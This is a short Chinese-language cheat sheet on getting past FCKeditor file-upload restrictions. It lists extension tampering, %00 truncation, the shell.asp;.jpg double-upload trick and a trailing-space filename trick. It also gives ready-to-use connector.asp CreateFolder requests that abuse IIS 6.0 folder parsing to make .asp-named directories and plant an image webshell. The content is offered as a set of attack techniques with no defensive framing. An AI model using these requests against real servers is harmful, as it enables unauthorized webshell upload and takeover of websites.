上传限制
========

上传限制的突破方式很多，主要还是抓包改扩展名，%00截断，添加文件头等

文件名限制
==========

二次上传绕过
------------

文件名' . ' 修改为' \_ '

FCK在上传了诸如shell.asp;.jpg的文件后，会自动将文件名改为shell\_asp;.jpg。可以继续上传同名文件，文件名会变为shell.asp;(1).jpg

提交shell.php+空格绕过
----------------------

提交shell.php+空格绕过

空格只支持windows系统，linux系统是不支持的，可提交shell.php+空格来绕过文件名限制。

iis6.0突破文件夹限制
====================

    Fckeditor/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&Type=File&CurrentFolder=/shell.asp&NewFolderName=z.asp
    FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&Type=Image&CurrentFolder=/shell.asp&NewFolderName=z&uuid=1244789975684
    FCKeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=CreateFolder&CurrentFolder=/&Type=Image&NewFolderName=shell.asp

文件解析限制
============

通过Fckeditor编辑器在文件上传页面中，创建诸如1.asp文件夹，然后再到该文件夹下上传一个图片的webshell文件，获取其shell。

    http://www.0-sec.org/images/upload/201806/image/1.asp/1.jpg
